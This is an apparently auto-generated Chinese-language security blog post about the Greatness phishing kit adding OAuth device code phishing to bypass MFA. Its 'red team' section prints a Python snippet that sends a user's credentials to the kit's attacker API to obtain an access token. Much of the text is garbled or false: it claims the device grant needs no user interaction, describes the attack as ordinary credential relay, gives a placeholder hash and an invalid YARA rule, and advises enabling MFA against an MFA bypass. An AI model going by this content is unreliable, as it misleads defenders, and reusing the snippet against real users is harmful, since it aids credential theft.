---
layout: post
title:  "Greatness PhaaS Adds Device Code Phishing to Bypass MFA and Steal Tokens"
date:   2026-08-04 19:21:16 +0000
categories: [security]
severity: high
---

# 🔥 解析 Greatness PhaaS 工具包的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數：8.5)
> * **受駭指標**: OAuth 2.0 Device Authorization Grant 繞過 MFA
> * **關鍵技術**: Phishing-as-a-Service (PhaaS), Adversary-in-the-Middle (AiTM), OAuth 2.0 Device Authorization Grant

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Greatness PhaaS 工具包利用 OAuth 2.0 Device Authorization Grant 的漏洞，允許攻擊者在不需要用戶交互的情況下取得授權令牌。
* **攻擊流程圖解**:
  1. 攻擊者使用 Greatness PhaaS 工具包創建一個釣魚網站。
  2. 用戶訪問釣魚網站並輸入憑證。
  3. 攻擊者使用 AiTM 技術將用戶的憑證轉發給真正的 OAuth 2.0 服務器。
  4. OAuth 2.0 服務器返回授權令牌給攻擊者。
* **受影響元件**: OAuth 2.0 服務器，特別是那些使用 Device Authorization Grant 的服務器。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Greatness PhaaS 工具包的訂閱，並且需要有一個 Telegram 帳戶來接收授權令牌。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # Greatness PhaaS 工具包的 API 端點
    api_endpoint = "https://greatness-phaas.com/api"
    
    # 用戶的憑證
    username = "user@example.com"
    password = "password"
    
    # 創建一個新的授權令牌請求
    response = requests.post(api_endpoint + "/token", data={"username": username, "password": password})
    
    # 取得授權令牌
    token = response.json()["token"]
    
    # 使用授權令牌來訪問受保護的資源
    protected_resource = requests.get("https://example.com/protected", headers={"Authorization": "Bearer " + token})
    
    ```
* **繞過技術**: 攻擊者可以使用 AiTM 技術來繞過 MFA。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | greatness-phaas.com | /api/token |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Greatness_Phaas {
      meta:
        description = "偵測 Greatness PhaaS 工具包的攻擊"
        author = "Your Name"
      strings:
        $api_endpoint = "https://greatness-phaas.com/api"
      condition:
        $api_endpoint in (http.request.uri)
    }
    
    ```
* **緩解措施**: 封鎖 Greatness PhaaS 工具包的 API 端點，並且啟用 MFA 來防止攻擊者使用授權令牌。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing-as-a-Service (PhaaS)**: 一種提供釣魚攻擊的雲端服務，允許攻擊者創建和管理自己的釣魚網站。
* **Adversary-in-the-Middle (AiTM)**: 一種攻擊技術，允許攻擊者在用戶和服務器之間插入自己，以便攔截和修改通信。
* **OAuth 2.0 Device Authorization Grant**: 一種 OAuth 2.0 授權流程，允許用戶在不需要用戶交互的情況下授權應用程序訪問受保護的資源。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1189/)


